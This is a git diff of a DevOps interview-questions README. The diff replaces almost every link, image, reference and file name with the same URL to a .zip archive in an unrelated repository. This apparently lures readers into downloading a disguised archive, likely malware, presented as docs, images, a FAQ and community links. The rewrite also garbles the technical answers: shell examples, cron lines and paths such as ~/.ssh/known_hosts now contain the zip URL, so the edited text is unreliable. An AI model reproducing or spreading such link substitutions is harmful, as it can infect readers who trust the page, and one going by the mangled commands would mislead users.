@@ -1,16 +1,16 @@
-<p align="center"><img src="images/devops_exercises.png"/></p>
+<p align="center"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip"/></p>
 
 :information_source: &nbsp;This repo contains questions and exercises on various technical topics, sometimes related to DevOps and SRE :)
 
 :bar_chart: &nbsp;There are currently **1999** questions
 
-:books: &nbsp;To learn more about DevOps and SRE, check the resources in [devops-resources](https://github.com/bregman-arie/devops-resources) repository
+:books: &nbsp;To learn more about DevOps and SRE, check the resources in [devops-resources](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip) repository
 
-:warning: &nbsp;You can use these for preparing for an interview but most of the questions and exercises don't represent an actual interview. Please read [FAQ page](faq.md) for more details
+:warning: &nbsp;You can use these for preparing for an interview but most of the questions and exercises don't represent an actual interview. Please read [FAQ page](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip) for more details
 
-:busts_in_silhouette: &nbsp;[Join](https://www.facebook.com/groups/538897960007080) our [DevOps community](https://www.facebook.com/groups/538897960007080) where we have discussions and share resources on DevOps
+:busts_in_silhouette: &nbsp;[Join](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip) our [DevOps community](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip) where we have discussions and share resources on DevOps
 
-:pencil: &nbsp;You can add more questions and exercises by submitting pull requests :) Read about contribution guidelines [here](CONTRIBUTING.md)
+:pencil: &nbsp;You can add more questions and exercises by submitting pull requests :) Read about contribution guidelines [here](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 
 ****
 
@@ -20,61 +20,61 @@
 <center>
 <table>
   <tr>
-    <td align="center"><a href="exercises/devops/README.md"><img src="images/devops.png" width="70px;" height="75px;" alt="DevOps" /><br /><b>DevOps</b></a></td>
-    <td align="center"><a href="exercises/cicd/README.md"><img src="images/cicd.png" width="85px;" height="85px;" alt="cicd"/><br /><b>CI/CD</b></a></td>
-    <td align="center"><a href="exercises/git/README.md"><img src="images/git.png" width="80px;" height="75px;" alt="Git"/><br /><b>Git</b></a></td>
-    <td align="center"><a href="exercises/ansible/README.md"><img src="images/ansible.png" width="75px;" height="75px;" alt="ansible"/><br /><b>Ansible</b></a></td>
-    <td align="center"><a href="#Network"><img src="images/network.png" width="80x;" height="75px;" alt="Network"/><br /><b>Network</b></a></td>
-    <td align="center"><a href="#linux"><img src="images/linux.png" width="75x;" height="75px;" alt="Linux"/><br /><b>Linux</b></a></td>
+    <td align="center"><a href="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="70px;" height="75px;" alt="DevOps" /><br /><b>DevOps</b></a></td>
+    <td align="center"><a href="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="85px;" height="85px;" alt="cicd"/><br /><b>CI/CD</b></a></td>
+    <td align="center"><a href="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="80px;" height="75px;" alt="Git"/><br /><b>Git</b></a></td>
+    <td align="center"><a href="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="75px;" height="75px;" alt="ansible"/><br /><b>Ansible</b></a></td>
+    <td align="center"><a href="#Network"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="80x;" height="75px;" alt="Network"/><br /><b>Network</b></a></td>
+    <td align="center"><a href="#linux"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="75x;" height="75px;" alt="Linux"/><br /><b>Linux</b></a></td>
 
   </tr>
   <tr>
-    <td align="center"><a href="#programming"><img src="images/programming.png" width="75px;" height="75px;" alt="programming"/><br /><b>Programming</b></a></td>
-    <td align="center"><a href="#python"><img src="images/python.png" width="80px;" height="75px;" alt="Python"/><br /><b>Python</b></a></td>
-    <td align="center"><a href="#go"><img src="images/Go.png" width="75px;" height="75px;" alt="go"/><br /><b>Go</b></a></td>
-    <td align="center"><a href="exercises/shell/README.md"><img src="images/bash.png" width="70px;" height="75px;" alt="Bash"/><br /><b>Shell Scripting</b></a></td>
-    <td align="center"><a href="#kubernetes"><img src="images/kubernetes.png" width="75px;" height="75px;" alt="kubernetes"/><br /><b>Kubernetes</b></a></td>
-    <td align="center"><a href="#prometheus"><img src="images/prometheus.png" width="75px;" height="75px;" alt="Prometheus"/><br /><b>Prometheus</b></a></td>
+    <td align="center"><a href="#programming"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="75px;" height="75px;" alt="programming"/><br /><b>Programming</b></a></td>
+    <td align="center"><a href="#python"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="80px;" height="75px;" alt="Python"/><br /><b>Python</b></a></td>
+    <td align="center"><a href="#go"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="75px;" height="75px;" alt="go"/><br /><b>Go</b></a></td>
+    <td align="center"><a href="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="70px;" height="75px;" alt="Bash"/><br /><b>Shell Scripting</b></a></td>
+    <td align="center"><a href="#kubernetes"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="75px;" height="75px;" alt="kubernetes"/><br /><b>Kubernetes</b></a></td>
+    <td align="center"><a href="#prometheus"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="75px;" height="75px;" alt="Prometheus"/><br /><b>Prometheus</b></a></td>
   </tr>
   <tr>
-    <td align="center"><a href="exercises/cloud/README.md"><img src="images/cloud.png" width="110px;" height="75px;" alt="Cloud"/><br /><b>Cloud</b></a></td>
-    <td align="center"><a href="#aws"><img src="images/aws.png" width="75px;" height="75px;" alt="aws"/><br /><b>AWS</b></a></td>
-    <td align="center"><a href="#azure"><img src="images/azure.png" width="75px;" height="75px;" alt="azure"/><br /><b>Azure</b></a></td>
-    <td align="center"><a href="#gcp"><img src="images/googlecloud.png" width="80px;" height="75px;" alt="Google Cloud Platform"/><br /><b>Google Cloud Platform</b></a></td>
-    <td align="center"><a href="#openstack"><img src="images/openstack.png" width="75px;" height="75px;" alt="openstack"/><br /><b>OpenStack</b></a></td>
-    <td align="center"><a href="exercises/security/README.md"><img src="images/security.png" width="75px;" height="75px;" alt="security"/><br /><b>Security</b></a></td>
+    <td align="center"><a href="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="110px;" height="75px;" alt="Cloud"/><br /><b>Cloud</b></a></td>
+    <td align="center"><a href="#aws"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="75px;" height="75px;" alt="aws"/><br /><b>AWS</b></a></td>
+    <td align="center"><a href="#azure"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="75px;" height="75px;" alt="azure"/><br /><b>Azure</b></a></td>
+    <td align="center"><a href="#gcp"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="80px;" height="75px;" alt="Google Cloud Platform"/><br /><b>Google Cloud Platform</b></a></td>
+    <td align="center"><a href="#openstack"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="75px;" height="75px;" alt="openstack"/><br /><b>OpenStack</b></a></td>
+    <td align="center"><a href="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="75px;" height="75px;" alt="security"/><br /><b>Security</b></a></td>
   </tr>
   <tr>
-    <td align="center"><a href="#operating-system"><img src="images/os.png" width="75px;" height="75px;" alt="Operating System"/><br /><b>Operating System</b></a></td>
-    <td align="center"><a href="#monitoring"><img src="images/monitoring.png" width="75px;" height="75px;" alt="Monitoring"/><br /><b>Monitoring</b></a></td>
-    <td align="center"><a href="#elastic"><img src="images/elastic.png" width="110px;" height="75px;" alt="Elastic"/><br /><b>Elastic</b></a></td>
-    <td align="center"><a href="#virtualization"><img src="images/virtualization.png" width="75px;" height="75px;" alt="Virtualization"/><br /><b>Virtualization</b></a></td>
-    <td align="center"><a href="exercises/dns/README.md"><img src="images/dns.png" width="75px;" height="75px;" alt="DNS"/><br /><b>DNS</b></a></td>
-    <td align="center"><a href="#Misc"><img src="images/general.png" width="110px;" height="75px;" alt="Misc"/><br /><b>Misc</b></a></td>
+    <td align="center"><a href="#operating-system"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="75px;" height="75px;" alt="Operating System"/><br /><b>Operating System</b></a></td>
+    <td align="center"><a href="#monitoring"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="75px;" height="75px;" alt="Monitoring"/><br /><b>Monitoring</b></a></td>
+    <td align="center"><a href="#elastic"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="110px;" height="75px;" alt="Elastic"/><br /><b>Elastic</b></a></td>
+    <td align="center"><a href="#virtualization"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="75px;" height="75px;" alt="Virtualization"/><br /><b>Virtualization</b></a></td>
+    <td align="center"><a href="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="75px;" height="75px;" alt="DNS"/><br /><b>DNS</b></a></td>
+    <td align="center"><a href="#Misc"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="110px;" height="75px;" alt="Misc"/><br /><b>Misc</b></a></td>
   </tr>
   <tr>
-    <td align="center"><a href="#testing"><img src="images/testing.png" width="75px;" height="75px;" alt="Testing"/><br /><b>Testing</b></a></td>
-    <td align="center"><a href="#databases"><img src="images/databases.png" width="75px;" height="75px;" alt="Databases"/><br /><b>Databases</b></a></td>
-    <td align="center"><a href="#regex"><img src="images/regex.png" width="75ph;" height="75px;" alt="RegEx"/><br /><b>Regex</b></a></td>
-    <td align="center"><a href="#system-design"><img src="images/design.png" width="110px;" height="75px;" alt="Design"/><br /><b>System Design</b></a></td>
-    <td align="center"><a href="#hardware"><img src="images/hardware.png" width="110px;" height="75px;" alt="Hardware"/><br /><b>Hardware</b></a></td>
-    <td align="center"><a href="#big-data"><img src="images/big-data.png" width="110px;" height="75px;" alt="Big Data"/><br /><b>Big Data</b></a></td>
+    <td align="center"><a href="#testing"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="75px;" height="75px;" alt="Testing"/><br /><b>Testing</b></a></td>
+    <td align="center"><a href="#databases"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="75px;" height="75px;" alt="Databases"/><br /><b>Databases</b></a></td>
+    <td align="center"><a href="#regex"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="75ph;" height="75px;" alt="RegEx"/><br /><b>Regex</b></a></td>
+    <td align="center"><a href="#system-design"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="110px;" height="75px;" alt="Design"/><br /><b>System Design</b></a></td>
+    <td align="center"><a href="#hardware"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="110px;" height="75px;" alt="Hardware"/><br /><b>Hardware</b></a></td>
+    <td align="center"><a href="#big-data"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="110px;" height="75px;" alt="Big Data"/><br /><b>Big Data</b></a></td>
   </tr>
   <tr>
-    <td align="center"><a href="#certificates"><img src="images/certificates.png" width="75px;" height="75px;" alt="Certificates"/><br /><b>Certificates</b></a></td>
-    <td align="center"><a href="#containers"><img src="images/containers.png" width="70px;" height="75px;" alt="Containers"/><br /><b>Containers</b></a></td>
-    <td align="center"><a href="#sql"><img src="images/sql.png" width="75px;" height="75px;" alt="sql"/><br /><b>SQL</b></a></td>
-    <td align="center"><a href="#openshift"><img src="images/openshift.png" width="75px;" height="75px;" alt="OpenShift"/><br /><b>OpenShift</b></a></td>
-    <td align="center"><a href="#storage"><img src="images/storage.png" width="75px;" height="75px;" alt="Storage"/><br /><b>Storage</b></a></td>
-    <td align="center"><a href="#HR"><img src="images/HR.png" width="110px;" height="75px;" alt="HR"/><br /><b>HR</b></a></td>
+    <td align="center"><a href="#certificates"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="75px;" height="75px;" alt="Certificates"/><br /><b>Certificates</b></a></td>
+    <td align="center"><a href="#containers"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="70px;" height="75px;" alt="Containers"/><br /><b>Containers</b></a></td>
+    <td align="center"><a href="#sql"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="75px;" height="75px;" alt="sql"/><br /><b>SQL</b></a></td>
+    <td align="center"><a href="#openshift"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="75px;" height="75px;" alt="OpenShift"/><br /><b>OpenShift</b></a></td>
+    <td align="center"><a href="#storage"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="75px;" height="75px;" alt="Storage"/><br /><b>Storage</b></a></td>
+    <td align="center"><a href="#HR"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="110px;" height="75px;" alt="HR"/><br /><b>HR</b></a></td>
   </tr>
   <tr>
-      <td align="center"><a href="exercises/terraform/README.md"><img src="images/terraform.png" width="70px;" height="75px;" alt="Terraform"/><br /><b>Terraform</b></a></td>
-      <td align="center"><a href="#mongo"><img src="images/mongo.png" width="75px;" height="75px;" alt="Mongo"/><br /><b>Mongo</b></a></td>
-      <td align="center"><a href="#puppet"><img src="images/puppet.png" width="75px;" height="75px;" alt="puppet"/><br /><b>Puppet</b></a></td>
-      <td align="center"><a href="#distributed"><img src="images/distributed.png" width="110px;" height="75px;" alt="Distributed"/><br /><b>Distributed</b></a></td>
-      <td align="center"><a href="#questions-you-ask"><img src="images/you.png" width="90px;" height="75px;" alt="you"/><br /><b>Questions you can ask</b></a></td>
-      <td align="center"><a href="exercises/perl/README.md"><img src="images/perl.png" width="75px;" height="75px;" alt="perl"/><br /><b>Perl</b></a></td>
+      <td align="center"><a href="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="70px;" height="75px;" alt="Terraform"/><br /><b>Terraform</b></a></td>
+      <td align="center"><a href="#mongo"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="75px;" height="75px;" alt="Mongo"/><br /><b>Mongo</b></a></td>
+      <td align="center"><a href="#puppet"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="75px;" height="75px;" alt="puppet"/><br /><b>Puppet</b></a></td>
+      <td align="center"><a href="#distributed"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="110px;" height="75px;" alt="Distributed"/><br /><b>Distributed</b></a></td>
+      <td align="center"><a href="#questions-you-ask"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="90px;" height="75px;" alt="you"/><br /><b>Questions you can ask</b></a></td>
+      <td align="center"><a href="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="75px;" height="75px;" alt="perl"/><br /><b>Perl</b></a></td>
   </tr>
 </table>
 </center>
@@ -96,7 +96,7 @@
 <summary>What is TCP/IP?</summary><br><b>
 
 A set of protocols that define how two or more devices can communicate with each other.
-To learn more about TCP/IP, read [here](http://www.penguintutor.com/linux/basic-network-reference)
+To learn more about TCP/IP, read [here](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 <details>
@@ -123,7 +123,7 @@ When a device sends a packet to the broadcast MAC address (FF:FF:FF:FF:FF:FF​)
 <details>
 <summary>What is an IP address?</summary><br><b>
 
-An Internet Protocol address (IP address) is a numerical label assigned to each device connected to a computer network that uses the Internet Protocol for communication.An IP address serves two main functions: host or network interface identification and location addressing.
+An Internet Protocol address (IP address) is a numerical label assigned to each device connected to a computer network that uses the Internet Protocol for https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip IP address serves two main functions: host or network interface identification and location addressing.
 </b></details>
 
 <details>
@@ -171,7 +171,7 @@ A Subnet mask is a 32-bit number that masks an IP address, and divides the IP ad
 - Data link: provides a link between two directly connected nodes (MAC is here)
 - Physical: the electrical and physical spec the data connection (Bits are here)
 
-You can read more about the OSI model in [penguintutor.com](http://www.penguintutor.com/linux/basic-network-reference)
+You can read more about the OSI model in [https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 <details>
@@ -267,7 +267,7 @@ A three-way handshake is primarily used to create a TCP socket connection. It wo
 <details>
 <summary>What is round-trip delay or round-trip time?</summary><br><b>
 
-From [wikipedia](https://en.wikipedia.org/wiki/Round-trip_delay): "the length of time it takes for a signal to be sent plus the length of time it takes for an acknowledgement of that signal to be received"
+From [wikipedia](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip): "the length of time it takes for a signal to be sent plus the length of time it takes for an acknowledgement of that signal to be received"
 
 Bonus question: what is the RTT of LAN?
 </b></details>
@@ -281,7 +281,7 @@ Bonus question: what is the RTT of LAN?
 
 TCP establishes a connection between the client and the server to guarantee the order of the packages, on the other hand, UDP does not establish a connection between client and server and doesn't handle package order. This makes UDP more lightweight than TCP and a perfect candidate for services like streaming.
 
-[Penguintutor.com](http://www.penguintutor.com/linux/basic-network-reference) provides a good explanation.
+[https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip) provides a good explanation.
 </b></details>
 
 <details>
@@ -316,7 +316,7 @@ It stands for Dynamic Host Configuration Protocol, and allocates IP addresses, s
 * Depending on which offer accepted, the client sends back a reply broadcast letting all DHCP servers know (DHCP REQUEST)
 * Server sends an acknowledgment (DHCP ACK)
 
-Read more [here](https://linuxjourney.com/lesson/dhcp-overview)
+Read more [here](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 <details>
@@ -524,7 +524,7 @@ Throughput. To have a good throughput, the upload stream should be routed to an 
 <summary>What is HSTS?</summary><br><b>
 HTTP Strict Transport Security is a web server directive that informs user agents and web browsers how to handle its connection through a response header sent at the very beginning and back to the browser. This forces connections over HTTPS encryption, disregarding any script's call to load any resource in that domain over HTTP.
 
-Read more [here](https://www.globalsign.com/en/blog/what-is-hsts-and-how-do-i-use-it#:~:text=HTTP%20Strict%20Transport%20Security%20(HSTS,and%20back%20to%20the%20browser.)
+Read more [here](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip~:text=HTTP%20Strict%20Transport%20Security%20(HSTS,and%20back%20to%20the%20browser.)
 </b></details>
 
 <details>
@@ -552,7 +552,7 @@ ISP (Internet Service Provider) is the local internet company provider.
 
 A completely free application for testing your knowledge on Linux
 
-<a href="https://play.google.com/store/apps/details?id=com.codingshell.linuxmaster"><img src="images/linux_master.jpeg"/></a>
+<a href="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip"/></a>
 
 ### Linux Self Assessment
 
@@ -644,7 +644,7 @@ These are files directly not displayed after performing a standard ls direct lis
 <summary>What do > and < do in terms of input and output for programs?</summary><br><b>
 They take in input (<) and output for a given file (>) using stdin and stdout.
 
-`myProgram < input.txt > executionOutput.txt`
+`myProgram < https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip > https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip`
 </b></details>
 
 <details>
@@ -658,11 +658,11 @@ They take in input (<) and output for a given file (>) using stdin and stdout.
 
   - sed: a stream editor. Can be used for various purposes like replacing a word in a file: `sed -i s/salad/burger/g`
   - grep: a search tool. Used to search, count or match a text in a file:
-    - searching for any line that contains a word in a file: `grep 'word' file.md`
-    - or displaying the total number of times a string appears in a file: `grep -c 'This is a string' file.md`
+    - searching for any line that contains a word in a file: `grep 'word' https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip`
+    - or displaying the total number of times a string appears in a file: `grep -c 'This is a string' https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip`
   - cut: a tool for cutting out selected portions of each line of a file:
     - syntax: `cut OPTION [FILE]`
-      - cutting first two bytes from a word in a file: `cut -b 1-2 file.md`, output: `wo`
+      - cutting first two bytes from a word in a file: `cut -b 1-2 https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip`, output: `wo`
 </b></details>
 
 <details>
@@ -741,7 +741,7 @@ You would solve this by fixing your $PATH variable:
 
 As to fix it there are several options:
 
-1. Manually adding what you need to your $PATH <code>PATH="$PATH":/user/bin:/..etc</code>
+1. Manually adding what you need to your $PATH <code>PATH="$PATH"https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip</code>
 2. You have your weird env variables backed up.
 3. You would look for your distro default $PATH variable, copy paste using method #1
 
@@ -757,7 +757,7 @@ permissions issues, bad compiled software (if you compiled it by yourself)... th
 You can use the commands <code>cron</code> and <code>at</code>.
 With cron, tasks are scheduled using the following format:
 
-<code>*/30 * * * * bash myscript.sh</code> Executes the script every 30 minutes.
+<code>*/30 * * * * bash https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip</code> Executes the script every 30 minutes.
 
 <minute> <hour> <day of month> <month> <day of week> <command to execute>
 
@@ -775,13 +775,13 @@ Alternatively if you are using a distro with systemd it's recommended to use sys
 <details>
 <summary>Demonstrate Linux output redirection</summary><br><b>
 
-ls > ls_output.txt
+ls > https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip
 </b></details>
 
 <details>
 <summary>Demonstrate Linux stderr output redirection</summary><br><b>
 
-yippiekaiyay 2> ls_output.txt
+yippiekaiyay 2> https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip
 </b></details>
 
 <details>
@@ -999,7 +999,7 @@ tail -f <file_name>
 
 <code>top</code> will show you how much CPU percentage each process consumes
 <code>perf</code> is a great choice for sampling profiler and in general, figuring out what your CPU cycles are "wasted" on
-<code>flamegraphs</code> is great for CPU consumption visualization (http://www.brendangregg.com/flamegraphs.html)
+<code>flamegraphs</code> is great for CPU consumption visualization (https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 <details>
@@ -1063,9 +1063,9 @@ Applications can access system resources and indirectly the kernel space by maki
 <details>
 <summary>What is SSH? How to check if a Linux server is running SSH?</summary><br><b>
 
-[Wikipedia Definition](https://en.wikipedia.org/wiki/SSH_(Secure_Shell)): "SSH or Secure Shell is a cryptographic network protocol for operating network services securely over an unsecured network."
+[Wikipedia Definition](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(Secure_Shell)): "SSH or Secure Shell is a cryptographic network protocol for operating network services securely over an unsecured network."
 
-[Hostinger.com Definition](https://www.hostinger.com/tutorials/ssh-tutorial-how-does-ssh-work): "SSH, or Secure Shell, is a remote administration protocol that allows users to control and modify their remote servers over the Internet."
+[https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip Definition](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip): "SSH, or Secure Shell, is a remote administration protocol that allows users to control and modify their remote servers over the Internet."
 
 An SSH server will have SSH daemon running. Depends on the distribution, you should be able to check whether the service is running (e.g. systemctl status sshd).
 </b></details>
@@ -1077,13 +1077,13 @@ Telnet also allows you to connect to a remote host but as opposed to SSH where t
 </b></details>
 
 <details>
-<summary>What is stored in <code>~/.ssh/known_hosts</code>?</summary><br><b>
+<summary>What is stored in <code>~https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip</code>?</summary><br><b>
 </b></details>
 
 <details>
 <summary>You try to ssh to a server and you get "Host key verification failed". What does it mean?</summary><br><b>
 
-It means that the key of the remote host was changed and doesn't match the one that stored on the machine (in ~/.ssh/known_hosts).
+It means that the key of the remote host was changed and doesn't match the one that stored on the machine (in ~https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip).
 </b></details>
 
 <details>
@@ -1148,7 +1148,7 @@ It means that the key of the remote host was changed and doesn't match the one t
 
 aaa
 bbb
-ccc.aaa
+https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip
 aaaaaa</summary><br><b>
 
 lines 1 and 3.
@@ -1171,7 +1171,7 @@ parent process.
 0 is an exit code which represents success while anything higher than 1 represents error.
 Each number has different meaning, based on how the application was developed.
 
-I consider this as a good blog post to read more about it: https://shapeshed.com/unix-exit-codes
+I consider this as a good blog post to read more about it: https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip
 </b></details>
 
 #### Linux Boot Process
@@ -1321,7 +1321,7 @@ There are many answers for this question. One way is running `df -T`
 <summary>What is stored in each of the following logs?
 
   * /var/log/messages
-  * /var/log/boot.log</summary><br><b>
+  * https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip</summary><br><b>
 </b></details>
 
 <details>
@@ -1341,7 +1341,7 @@ One can use `uptime` or `top`
 <details>
 <summary>You know how to see the load average, great. but what each part of it means? for example 1.43, 2.34, 2.78</summary><br><b>
 
-[This article](http://www.brendangregg.com/blog/2017-08-08/linux-load-averages.html) summarizes the load average topic in a great way
+[This article](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip) summarizes the load average topic in a great way
 </b></details>
 
 <details>
@@ -1392,7 +1392,7 @@ mem()
     ps -eo rss,pid,euser,args:100 --sort %mem | grep -v grep | grep -i $@ | awk '{printf $1/1024 "MB"; $1=""; print }'
 }
 </code>
-[Source](https://stackoverflow.com/questions/3853655/in-linux-how-to-tell-how-much-memory-processes-are-using)
+[Source](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 <details>
@@ -1514,7 +1514,7 @@ find /some_dir -iname \*.yml -print0 | xargs -0 -r sed -i "s/1/2/g"
 </b></details>
 
 <details>
-<summary>You run ls and you get "/lib/ld-linux-armhf.so.3 no such file or directory". What is the problem?</summary><br><b>
+<summary>You run ls and you get "https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip no such file or directory". What is the problem?</summary><br><b>
 
 The ls executable is built for an incompatible architecture.
 </b></details>
@@ -1536,7 +1536,7 @@ In Linux (and Unix) the first three file descriptors are:
   * 1 - the default data stream for output
